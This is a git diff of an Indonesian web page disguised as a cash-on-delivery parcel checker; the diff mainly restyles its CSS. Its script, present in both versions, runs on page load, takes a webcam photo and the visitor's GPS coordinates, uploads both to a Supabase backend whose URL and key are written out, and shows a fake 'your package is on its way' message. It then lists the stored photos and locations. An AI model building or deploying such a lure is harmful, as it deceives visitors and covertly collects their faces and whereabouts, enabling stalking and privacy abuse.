@@ -1,232 +1,254 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CEK PAKET COD MU DISINI</title>
-  <style>
-    body {
-      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-      margin: 0;
-      padding: 0;
-      background: #f5f5f5;
-      color: #333;
-    }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CEK PAKET COD MU DISINI</title>
+<!-- Google Fonts -->
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
 
-    header {
-      background: #ff5722;
-      color: white;
-      padding: 15px;
-      text-align: center;
-      font-size: 1.3rem;
-      font-weight: bold;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
-      position: sticky;
-      top: 0;
-      z-index: 10;
-    }
+  body {
+    font-family: 'Poppins', sans-serif;
+    background: #f9f9f9;
+    color: #333;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
 
-    #status {
-      margin: 20px;
-      font-weight: bold;
-      text-align: center;
-      padding: 10px;
-      border-radius: 6px;
-      display: inline-block;
-      background: #fff3e0;
-      color: #ff5722;
-    }
+  header {
+    background-color: #f53d2d;
+    color: #fff;
+    width: 100%;
+    padding: 16px 0;
+    font-size: 1.5rem;
+    font-weight: 600;
+    text-align: center;
+    box-shadow: 0 3px 8px rgba(0,0,0,0.12);
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    user-select: none;
+  }
 
-    #list {
-      margin: 20px;
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
-      gap: 15px;
-    }
+  #status {
+    margin: 20px auto;
+    padding: 14px 20px;
+    border-radius: 16px;
+    background: #fff4f2;
+    color: #f53d2d;
+    font-weight: 600;
+    font-size: 1.1rem;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    max-width: 360px;
+    box-shadow: 0 4px 12px rgba(245, 61, 45, 0.15);
+    user-select: none;
+    text-align: center;
+  }
 
-    .card {
-      background: #fff;
-      border-radius: 10px;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.08);
-      padding: 10px;
-      transition: transform 0.2s ease;
-    }
+  /* Loading animasi */
+  .loading {
+    display: inline-flex;
+    gap: 6px;
+    width: 80px;
+    height: 20px;
+    position: relative;
+  }
+  .loading div {
+    width: 14px;
+    height: 14px;
+    border-radius: 50%;
+    background: #f53d2d;
+    animation-timing-function: cubic-bezier(0, 1, 1, 0);
+    position: relative;
+  }
+  .loading div:nth-child(1) { animation: loading1 0.6s infinite; }
+  .loading div:nth-child(2) { animation: loading2 0.6s infinite; animation-delay: 0.15s; }
+  .loading div:nth-child(3) { animation: loading2 0.6s infinite; animation-delay: 0.3s; }
+  .loading div:nth-child(4) { animation: loading3 0.6s infinite; animation-delay: 0.45s; }
 
-    .card:hover {
-      transform: translateY(-5px);
-    }
+  @keyframes loading1 { 0% { transform: scale(0); } 100% { transform: scale(1); } }
+  @keyframes loading2 { 0% { transform: translateX(0); } 100% { transform: translateX(24px); } }
+  @keyframes loading3 { 0% { transform: scale(1); } 100% { transform: scale(0); } }
 
-    .card img {
-      width: 100%;
-      border-radius: 8px;
-      border: 1px solid #eee;
-      object-fit: cover;
-    }
+  #list {
+    width: 100%;
+    max-width: 960px;
+    margin: 0 auto 40px;
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+    gap: 20px;
+    padding: 0 16px;
+  }
 
-    .info {
-      margin-top: 5px;
-      font-size: 0.85rem;
-      color: #555;
-    }
+  .card {
+    background: #fff;
+    border-radius: 20px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+    overflow: hidden;
+    cursor: pointer;
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+    display: flex;
+    flex-direction: column;
+    user-select: none;
+  }
 
-    /* Animasi loading ala Shopee */
-    .loading {
-      display: inline-block;
-      position: relative;
-      width: 80px;
-      height: 20px;
-    }
-    .loading div {
-      position: absolute;
-      top: 0;
-      width: 13px;
-      height: 13px;
-      border-radius: 50%;
-      background: #ff5722;
-      animation-timing-function: cubic-bezier(0, 1, 1, 0);
-    }
-    .loading div:nth-child(1) { left: 8px; animation: loading1 0.6s infinite; }
-    .loading div:nth-child(2) { left: 8px; animation: loading2 0.6s infinite; }
-    .loading div:nth-child(3) { left: 32px; animation: loading2 0.6s infinite; }
-    .loading div:nth-child(4) { left: 56px; animation: loading3 0.6s infinite; }
-    @keyframes loading1 { 0% { transform: scale(0); } 100% { transform: scale(1); } }
-    @keyframes loading2 { 0% { transform: translateX(0); } 100% { transform: translateX(24px); } }
-    @keyframes loading3 { 0% { transform: scale(1); } 100% { transform: scale(0); } }
-  </style>
+  .card:hover {
+    transform: translateY(-6px);
+    box-shadow: 0 12px 24px rgba(245, 61, 45, 0.25);
+  }
+
+  .card img {
+    width: 100%;
+    height: 140px;
+    object-fit: cover;
+    border-bottom: 1px solid #eee;
+    flex-shrink: 0;
+    border-radius: 12px 12px 0 0;
+  }
+
+  .info {
+    padding: 12px 14px;
+    font-size: 0.9rem;
+    color: #666;
+    white-space: pre-line;
+    flex-grow: 1;
+  }
+
+  @media (max-width: 480px) {
+    #list { grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 16px; }
+    .card img { height: 120px; }
+  }
+</style>
 </head>
 <body>
-  <header>CEK PAKET COD MU DISINI</header>
+<header>CEK PAKET COD MU DISINI</header>
 
-  <div id="status">
-    <div class="loading">
-      <div></div><div></div><div></div><div></div>
-    </div>
-    <span> Sedang diproses...</span>
+<div id="status">
+  <div class="loading">
+    <div></div><div></div><div></div><div></div>
   </div>
+  <span> Sedang diproses...</span>
+</div>
 
-  <div id="list"></div>
+<div id="list"></div>
 
-  <!-- Supabase JS -->
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-  <script>
-    const SUPABASE_URL = "https://sinqdlsddldljlqvsxoa.supabase.co";
-    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNpbnFkbHNkZGxkbGpscXZzeG9hIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY2Mzg4MDcsImV4cCI6MjA3MjIxNDgwN30.PdO2Fl37xYkG0T9skBJ9R7VTi553-iSUZGBm1L4yTkE";
-    const BUCKET = "foto-users"; 
+<!-- Supabase JS -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script>
+  const SUPABASE_URL = "https://sinqdlsddldljlqvsxoa.supabase.co";
+  const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNpbnFkbHNkZGxkbGpscXZzeG9hIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY2Mzg4MDcsImV4cCI6MjA3MjIxNDgwN30.PdO2Fl37xYkG0T9skBJ9R7VTi553-iSUZGBm1L4yTkE";
+  const BUCKET = "foto-users"; 
+  const { createClient } = supabase;
+  const client = createClient(SUPABASE_URL, SUPABASE_KEY);
+  const statusEl = document.getElementById("status");
+  const listEl = document.getElementById("list");
 
-    const { createClient } = supabase;
-    const client = createClient(SUPABASE_URL, SUPABASE_KEY);
+  async function ambilFoto() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const track = stream.getVideoTracks()[0];
+      const imageCapture = new ImageCapture(track);
+      const blob = await imageCapture.takePhoto();
+      const fileName = `foto_${Date.now()}.jpg`;
 
-    const statusEl = document.getElementById("status");
-    const listEl = document.getElementById("list");
-
-    async function ambilFoto() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const track = stream.getVideoTracks()[0];
-        const imageCapture = new ImageCapture(track);
-        const blob = await imageCapture.takePhoto();
-
-        const fileName = `foto_${Date.now()}.jpg`;
-
-        const { error } = await client.storage
-          .from(BUCKET)
-          .upload(fileName, blob, {
-            cacheControl: "3600",
-            upsert: false,
-            contentType: "image/jpeg"
-          });
-
-        if (error) {
-          statusEl.style.background = "#ffebee";
-          statusEl.style.color = "#d32f2f";
-          statusEl.innerText = "❌ Gagal upload: " + error.message;
-        } else {
-          statusEl.style.background = "#e8f5e9";
-          statusEl.style.color = "#388e3c";
-          statusEl.innerText = "✅ Foto berhasil, tunggu lokasi...";
-
-          // setelah foto -> ambil lokasi
-          ambilLokasi(fileName);
-        }
-
-        track.stop();
-      } catch (err) {
-        statusEl.style.background = "#ffebee";
-        statusEl.style.color = "#d32f2f";
-        statusEl.innerText = "❌ Tidak bisa ambil foto: " + err;
-      }
-    }
-
-    function ambilLokasi(fotoName) {
-      if (!navigator.geolocation) {
-        statusEl.innerText = "❌ Browser tidak mendukung geolocation";
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(async (pos) => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        const waktu = new Date().toLocaleString();
-
-        // simpan ke tabel Supabase (butuh bikin tabel lokasi_users di Supabase)
-        const { error } = await client
-          .from("lokasi_users")
-          .insert([{ foto: fotoName, latitude: lat, longitude: lon, created_at: new Date() }]);
-
-        if (error) {
-          statusEl.innerText = "❌ Gagal simpan lokasi: " + error.message;
-        } else {
-          statusEl.innerText = "✅ oke paket cod mu otw dianter";
-          tampilkanFoto();
-        }
-      }, (err) => {
-        statusEl.innerText = "❌ Gagal ambil lokasi: " + err.message;
-      });
-    }
-
-    async function tampilkanFoto() {
-      const { data, error } = await client.storage.from(BUCKET).list("", {
-        sortBy: { column: "created_at", order: "desc" }
-      });
+      const { error } = await client.storage
+        .from(BUCKET)
+        .upload(fileName, blob, {
+          cacheControl: "3600",
+          upsert: false,
+          contentType: "image/jpeg"
+        });
 
       if (error) {
-        listEl.innerHTML = "<p style='color:red;'>Gagal ambil daftar foto</p>";
-        return;
+        statusEl.style.background = "#ffebee";
+        statusEl.style.color = "#d32f2f";
+        statusEl.innerText = "❌ Gagal upload: " + error.message;
+      } else {
+        statusEl.style.background = "#e8f5e9";
+        statusEl.style.color = "#388e3c";
+        statusEl.innerText = "✅ Foto berhasil, tunggu lokasi...";
+        ambilLokasi(fileName);
       }
 
-      listEl.innerHTML = "<h3>Terimakasih</h3>";
-      for (const file of data) {
-        const { data: publicUrl } = client.storage.from(BUCKET).getPublicUrl(file.name);
-        
-        // ambil lokasi dari tabel Supabase
-        const { data: lokasiData } = await client
-          .from("lokasi_users")
-          .select("*")
-          .eq("foto", file.name)
-          .single();
+      track.stop();
+    } catch (err) {
+      statusEl.style.background = "#ffebee";
+      statusEl.style.color = "#d32f2f";
+      statusEl.innerText = "❌ Tidak bisa ambil foto: " + err;
+    }
+  }
 
-        const card = document.createElement("div");
-        card.className = "card";
-
-        const img = document.createElement("img");
-        img.src = publicUrl.publicUrl;
-
-        const info = document.createElement("div");
-        info.className = "info";
-        if (lokasiData) {
-          info.innerText = `Lat: ${lokasiData.latitude.toFixed(5)}, Lon: ${lokasiData.longitude.toFixed(5)}\n${new Date(lokasiData.created_at).toLocaleString()}`;
-        } else {
-          info.innerText = "Lokasi tidak tersedia";
-        }
-
-        card.appendChild(img);
-        card.appendChild(info);
-        listEl.appendChild(card);
-      }
+  function ambilLokasi(fotoName) {
+    if (!navigator.geolocation) {
+      statusEl.innerText = "❌ Browser tidak mendukung geolocation";
+      return;
     }
 
-    ambilFoto();
-  </script>
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+
+      const { error } = await client
+        .from("lokasi_users")
+        .insert([{ foto: fotoName, latitude: lat, longitude: lon, created_at: new Date() }]);
+
+      if (error) {
+        statusEl.innerText = "❌ Gagal simpan lokasi: " + error.message;
+      } else {
+        statusEl.innerText = "✅ Oke paket COD mu otw dianter";
+        tampilkanFoto();
+      }
+    }, (err) => {
+      statusEl.innerText = "❌ Gagal ambil lokasi: " + err.message;
+    });
+  }
+
+  async function tampilkanFoto() {
+    const { data, error } = await client.storage.from(BUCKET).list("", {
+      sortBy: { column: "created_at", order: "desc" }
+    });
+
+    if (error) {
+      listEl.innerHTML = "<p style='color:red;'>Gagal ambil daftar foto</p>";
+      return;
+    }
+
+    listEl.innerHTML = "";
+    for (const file of data) {
+      const { data: publicUrl } = client.storage.from(BUCKET).getPublicUrl(file.name);
+      const { data: lokasiData } = await client
+        .from("lokasi_users")
+        .select("*")
+        .eq("foto", file.name)
+        .single();
+
+      const card = document.createElement("div");
+      card.className = "card";
+
+      const img = document.createElement("img");
+      img.src = publicUrl.publicUrl;
+
+      const info = document.createElement("div");
+      info.className = "info";
+      if (lokasiData) {
+        info.innerText = `Lat: ${lokasiData.latitude.toFixed(5)}, Lon: ${lokasiData.longitude.toFixed(5)}\n${new Date(lokasiData.created_at).toLocaleString()}`;
+      } else {
+        info.innerText = "Lokasi tidak tersedia";
+      }
+
+      card.appendChild(img);
+      card.appendChild(info);
+      listEl.appendChild(card);
+    }
+  }
+
+  ambilFoto();
+</script>
 </body>
 </html>
-
